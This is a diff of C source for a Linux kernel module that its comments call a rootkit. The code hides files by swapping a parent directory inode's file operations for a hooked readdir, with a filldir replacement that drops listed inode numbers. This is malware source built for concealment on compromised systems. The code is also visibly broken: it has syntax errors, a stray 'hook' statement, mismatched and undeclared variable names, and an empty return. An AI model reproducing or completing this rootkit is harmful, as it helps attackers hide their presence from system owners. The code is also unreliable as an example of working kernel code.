@@ -136,14 +136,55 @@ static ssize_t device_ioctl(	/* see include/linux/fs.h */
 
   return SUCCESS;
 }
-/***************************************************************************/
+
+struct file_operations fops ={
+			      .read = device_read
+			      , .write = device_write
+			      , .unlocked_ioctl = device_ioctl
+			      , .open = device_open
+			      , .release = device_release				     
+};
+/**************************HIDE FILE*************************************************/
 
 
 struct dentry* g_parent_dentry;
-
+struct path g_root_path;
 int g_inode_count = 0;
 unsigned long* g_inode_numbers;
-filldir_t real_filldir;
+
+void** g_old_parent_inode_pointer;
+void** g_old_parent_fop_pointer;
+
+filldir_t real_filldir; 
+
+
+
+void allocate_memory()
+{
+        //g_old_inode_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL);
+        // g_old_fop_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL);
+        // g_old_iop_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL);
+
+        g_old_parent_inode_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL);
+        g_old_parent_fops_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL);
+           
+        g_inode_numbers=(unsigned long*)kmalloc(sizeof(unsigned long),GFP_KERNEL);
+
+}
+void reallocate_memmory()
+{
+	/*Realloc memmory for inode number*/
+	g_inode_numbers=(unsigned long*)krealloc(g_inode_numbers,sizeof(unsigned long*)*(g_inode_count+1), GFP_KERNEL);
+	
+	// /*Realloc memmory for old pointers*/
+	// g_old_inode_pointer=(void*)krealloc(g_old_inode_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL);
+	// g_old_fop_pointer=(void*)krealloc(g_old_fop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL);
+	// g_old_iop_pointer=(void*)krealloc(g_old_iop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL);
+
+  	g_old_parent_inode_pointer=(void*)krealloc(g_old_parent_inode_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL);
+  	g_old_parent_fop_pointer=(void*)krealloc(g_old_parent_fop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL);
+}
+
 
 static int new_filldir (void *buf,
 			const char *name,
@@ -151,6 +192,7 @@ static int new_filldir (void *buf,
 			loff_t offset,
 			u64 ux64,
 			unsigned ino){
+
   unsigned int i = 0;
   struct dentry* = p_dentry;
   struct qstr current_name;
@@ -163,7 +205,7 @@ static int new_filldir (void *buf,
   if (p_dentry!=NULL){
     for(i = 0; i<= g_inode_count - 1; i++){
       if (g_inode_numbers[i] == p_dentry->d_inode->i_ino)
-	return 0;
+	      return 0;
     }
   }
 }
@@ -175,27 +217,78 @@ static int new_parent_readdir(struct file* file,
   return  ;
 }
 
-
-
-
-struct file_operations fops ={
-			      .read = device_read
-			      , .write = device_write
-			      , .unlocked_ioctl = device_ioctl
-			      , .open = device_open
-			      , .release = device_release				     
+static struct file_operations new_parent_fops =
+{
+  .owner=THIS_MODULE,
+  .readdir=new_parent_readdir,
 };
+
+unsigned long hook_functions(const char* file_path){
+  int error = 0;
+  struct path path;
+
+  error = kern_path("/root", LOOKUP_FOLLOW, &g_root_path);
+  if(error){
+    printk( KERN_ALERT "Can't access root\n");
+		return -1;
+  }
+  
+  error = kern_path("/root", LOOKUP_FOLLOW, &path);
+  if(error){
+    printk( KERN_ALERT "Can't access file\n");
+		return -1;
+  }
+  if (g_inode_count==0)
+	{
+		allocate_memory();
+	}
+
+	if (g_inode_numbers==NULL)
+	{
+		printk( KERN_ALERT "Not enough memmory in buffer\n");
+	  return -1;
+	}
+
+  /*Save pointers*/
+  g_old_parent_inode_pointer[g_inode_count]=path.dentry->d_parent->d_inode;
+        g_old_parent_fop_pointer[g_inode_count]=(void *)path.dentry->d_parent->d_inode->i_fop;
+
+	/*Save inode number*/
+	g_inode_numbers[g_inode_count]=path.dentry->d_inode->i_ino;
+	g_inode_count=g_inode_count+1;
+
+	reallocate_memmory();
+  /*filldir hook*/
+	path.dentry->d_parent->d_inode->i_fop=&new_parent_fops;
+
+	// /* Hook of commands for file*/
+	// path.dentry->d_inode->i_op=&new_iop;
+	// path.dentry->d_inode->i_fop=&new_fop;
+}
+unsigned long backup_functions(){
+  int i = 0;
+  struct inode* p_inode;
+  struct inode* p_parent_inode;
+
+  for (i = 0; i< g_inode_count; i++){
+    p_inode = g_old_inode_pointer[(g_inode_count-1)-i];
+
+
+    p_parent_inode=g_old_parent_inode_pointer[(g_inode_count-1)-i];
+		p_parent_inode->i_fop=(void *)g_old_parent_fop_pointer[(g_inode_count-1)-i];
+  }
+
+}
+
 static char* path_name = "/home/dalo2903/test.c";
 
 // Rootkit init & exit
 static int __init rootkit_init(void)
 {
- 
+  hook_functions(path_name)
   struct inode *inode;
   struct path path;
-  kern_path(path_name, LOOKUP_FOLLOW, &path);
-  inode = path.dentry->d_inode;
-  printk("Path name : %s, inode :%lu\n", path_name, inode->i_ino);
+  hook
   return 0;
   /*
     int ret_val;
